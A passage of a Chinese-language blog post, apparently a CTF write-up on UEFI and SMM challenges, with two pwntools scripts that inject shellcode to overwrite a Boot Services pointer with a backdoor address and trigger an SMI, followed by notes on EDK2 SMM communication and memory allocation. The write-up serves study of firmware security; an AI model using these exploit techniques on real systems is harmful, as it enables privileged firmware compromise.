class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">boot_service = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;BootService @ 0x%x&#x27;</span>, boot_service)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">AllocatePool = <span class="number">0x6fd12f1</span></span><br><span class="line">LocateProtocol = <span class="number">0x6fcc7b4</span></span><br><span class="line">mSmmCommunication = <span class="number">0x6ad9310</span></span><br><span class="line">Communicate = <span class="number">0x6ad6abf</span></span><br><span class="line">Guid = <span class="number">0x9D76F4B1548E0872EC86B7F3B31CF11E</span></span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"><span class="comment">#//backdoor 0x7F06000</span></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;boot_service + <span class="number">320</span>&#125;</span>], 0x7F06000</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x38</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov r8, <span class="subst">&#123;buffer+<span class="number">0x30</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    mov r12, 0x23330000</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;Guid&#125;</span>  /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x18                              /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0                                 /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0</span></span><br><span class="line"><span class="string">    .quad 0x41414141</span></span><br><span class="line"><span class="string">    .quad 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接修改全局变量并使用out触发smi</p><p><del>不过还不是很清楚是怎么定位这些全局变量的(<strong>特别是smm_buffer</strong>),反编译去找?,不太懂,所以还是更喜欢第一种方法</del>(已解决)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./run.sh&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">smm_buffer = <span class="number">0x6ad9380</span></span><br><span class="line">guid = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)</span><br><span class="line">CommBuffer_offset = <span class="number">56</span></span><br><span class="line">BufferSize_offset = CommBuffer_offset + <span class="number">8</span></span><br><span class="line">ReturnStatus_offset = BufferSize_offset + <span class="number">8</span></span><br><span class="line">bootservice = <span class="number">0x6FD6B80</span></span><br><span class="line">backdoor = <span class="number">0x7F06000</span></span><br><span class="line">payload = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              </span></span><br><span class="line"><span class="string">mov rcx, 0x6FD6B80/* gBS-&gt;LocateProtocol = PrintFlag */</span></span><br><span class="line"><span class="string">add rcx, 0x140</span></span><br><span class="line"><span class="string">mov rdx, 0x7F06000</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad9400/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span></span><br><span class="line"><span class="string">mov rdx, 0xEC86B7F3B31CF11E</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string">mov rdx, 0x9D76F4B1548E0872</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* CommBuffer-&gt;MessageLength = 4 */</span></span><br><span class="line"><span class="string">mov rdx, 0x4</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 24/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="string">mov rdx, 0x41414141</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad93b8/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span></span><br><span class="line"><span class="string">mov rdx, 0x6ad9400</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span></span><br><span class="line"><span class="string">mov rdx, 0x1c</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax/* SMI */</span></span><br><span class="line"><span class="string">mov dx, 0xb2</span></span><br><span class="line"><span class="string">mov al, 0x00</span></span><br><span class="line"><span class="string">outb dx, al</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Your shellcode:&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">sl(payload.<span class="built_in">hex</span>())</span><br><span class="line">sl(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>我们任意反汇编一个UEFI程序都可以看到其调用约定是<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a>，因此参数在RCX、RDX、R8、R9中，然后堆栈。</p><h2 id="uefishell"><a href="#uefishell" class="headerlink" title="uefishell"></a>uefishell</h2><p>大多数的uefi类题目,最终提供给我们的交互接口都是一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,其允许我们直接输入机器码的十六进制表示,然后去以<code>ring 0</code>的身份去执行</p><p>然后出题人自己打上一些patch</p><p>最后我们能够直接看到的efi程序,一般就是这个</p><p>然后其一般还会能够与一个SMM驱动程序交互</p><p>当然其实也不一定,也有菜单类的uefi题目</p><h2 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h2><p>UEFI中每一个protocol与服务都会有一个GUID(全局唯一标识符Globally Unique Identifier)</p><p>很多交互接口都需要用到guid去寻找对应的protocol</p><p>在ida中很容易找到对应的guid</p><p>对于一些全局变量来说<strong>,其guid是始终固定的</strong></p><p>常见的如下(基于edk2)</p><div class="table-container"><table><thead><tr><th>name</th><th>guid</th></tr></thead><tbody><tr><td>gEfiSmmCommunicationProtocolGuid</td><td>0x32c3c5ac65db949d4cbd9dc6c68ed8e2</td></tr><tr><td></td><td></td></tr><tr><td></td></tr></tbody></table></div><h2 id="与SMM通信"><a href="#与SMM通信" class="headerlink" title="与SMM通信"></a>与SMM通信</h2><p>一般uefi题目都会有两个关键的文件,分别是</p><ol><li>前面提到的UEFIshell驱动处理程序,其是一个普通的uefi驱动程序,处于ring 0</li><li>以及一个运行在SMM状态下的模块(可能需要从OVMF.fd中提取)</li></ol><p>我们真正需要关心的其实就是两者之间的交互</p><p>对于后者,其在执行时一般都会有运行类似这样一段代码注册一个要执行的处理程序(SMI handler)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</p><p><strong>第二个参数就是指向这个handler的guid的指针</strong>,经常能用上</p><p><code>SmiHandlerRegister</code>声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiHandlerRegister</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span></span><br><span class="line"><span class="params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span></span><br><span class="line"><span class="params">  OUT EFI_HANDLE                    *DispatchHandle</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  SMI_HANDLER  *SmiHandler;</span><br><span class="line">  SMI_ENTRY    *SmiEntry;</span><br><span class="line">  LIST_ENTRY   *List;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((Handler == <span class="literal">NULL</span>) || (DispatchHandle == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler = AllocateZeroPool (<span class="keyword">sizeof</span> (SMI_HANDLER));</span><br><span class="line">  <span class="keyword">if</span> (SmiHandler == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;</span><br><span class="line">  SmiHandler-&gt;Handler    = Handler;</span><br><span class="line">  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HandlerType == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This is root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = &amp;mRootSmiEntry;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// None root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (SmiEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List = &amp;SmiEntry-&gt;SmiHandlers;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;SmiEntry = SmiEntry;</span><br><span class="line">  InsertTailList (List, &amp;SmiHandler-&gt;Link);</span><br><span class="line"></span><br><span class="line">  *DispatchHandle = (EFI_HANDLE)SmiHandler;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>对于前者其一般使用<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>协议提供的<code>Communicate()</code>方法与一个smm交流</p><p>在递归套娃后<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>其实就是下面这个结构体,其只有一个成员<code>Communicate</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EFI_MM_COMMUNICATION_PROTOCOL</span> &#123;</span></span><br><span class="line">  EFI_MM_COMMUNICATE    Communicate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>EFI_MM_COMMUNICATE</code>的定义没找着,但根据一些线索,我们能够知道他是一个函数指针</p><p>常见的其被初始化为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">**/</span><br><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCommunicationCommunicate</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span><br><span class="line"><span class="params">  IN OUT VOID                              *CommBuffer,</span></span><br><span class="line"><span class="params">  IN OUT UINTN                             *CommSize OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS                  Status;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER  *CommunicateHeader;</span><br><span class="line">  BOOLEAN                     OldInSmm;</span><br><span class="line">  UINTN                       TempCommSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check parameters</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (CommBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommBuffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CommSize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    TempCommSize = OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data) + CommunicateHeader-&gt;MessageLength;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    TempCommSize = *CommSize;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// CommSize must hold HeaderGuid and MessageLength</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (TempCommSize &lt; OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// If not already in SMM, then generate a Software SMI</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (!gSmmCorePrivate-&gt;InSmm &amp;&amp; gSmmCorePrivate-&gt;SmmEntryPointRegistered) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Put arguments for Software SMI in gSmmCorePrivate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    gSmmCorePrivate-&gt;CommunicationBuffer = CommBuffer;</span><br><span class="line">    gSmmCorePrivate-&gt;BufferSize          = TempCommSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Generate Software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Status = mSmmControl2-&gt;Trigger (mSmmControl2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (EFI_ERROR (Status)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return status from software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (CommSize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      *CommSize = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gSmmCorePrivate-&gt;ReturnStatus;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><p>第一个参数是指向这个<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>的指针</p></li><li><p>第二个参数一般是一个<code>EFI_SMM_COMMUNICATE_HEADER</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID             HeaderGuid;</span><br><span class="line">  UINTN                MessageLength;</span><br><span class="line">  UINT8                Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125;   EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><ul><li><p><code>HeaderGuid</code></p><p>Allows for disambiguation of the message format. Type <em>EFI_GUID</em> is defined in <em>InstallProtocolInterface()</em> .</p></li><li><p><code>MessageLength</code></p><p>Describes the size of <em>Data</em> (in bytes) and does not include the size of the header.</p></li><li><p><code>Data</code></p><p>Designates an array of bytes that is <em>MessageLength</em> in size</p></li></ul></li><li><p>第三个参数是size,一般不需要特意指定为NULL即可</p></li></ul><p>该函数将消息复制到全局变量中<strong>并触发软件 SMI 来处理它</strong>。<u>该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</u></p><hr><p>所以,一般这类题目都需要着重分析题目SMM程序注册的handler</p><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>bootservices中有这两个指针<strong>AllocatePages</strong>与<strong>AllocatePool</strong>都可以用于分配内存</p><blockquote><p>AllocatePages</p><p>Allocates pages of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates memory pages from the system.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_ALLOCATE_PAGES) (</span><br><span class="line">   IN EFI_ALLOCATE_TYPE                   Type,</span><br><span class="line">   IN EFI_MEMORY_TYPE                     MemoryType,</span><br><span class="line">   IN UINTN                               Pages,</span><br><span class="line">   IN OUT EFI_PHYSICAL_ADDRESS            *Memory</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Type</p><p>The type of allocation to perform. See “Related Definitions.”</p></li><li><p>MemoryType</p><p>The type of memory to allocate. The type EFI_MEMORY_TYPE is defined in “Related Definitions” below. These memory types are also described in more detail in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-before-exitbootservices">Memory Type Usage before ExitBootServices()</a>, and <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-after-exitbootservices">Memory Type Usage after ExitBootServices()</a> . Normal allocations (that is, allocations by any UEFI application) are of type EfiLoaderData. <em>MemoryType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>MemoryType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Pages</p><p>The number of contiguous 4 KiB pages to allocate.</p></li><li><p>Memory</p><p>Pointer to a physical address. On input, the way in which the address is used depends on the value of <em>Type</em>. See “Description” for more information. On output the address is set to the base of the page range that was allocated. See “Related Definitions.”</p></li></ul><p><strong>NOTE</strong>: UEFI Applications, UEFI Drivers, and UEFI OS Loaders <em>must not allocate memory of types</em> EfiReservedMemoryType, EfiMemoryMappedIO, <em>and</em> EfiUnacceptedMemoryType.</p><p><strong>Related Definitions</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 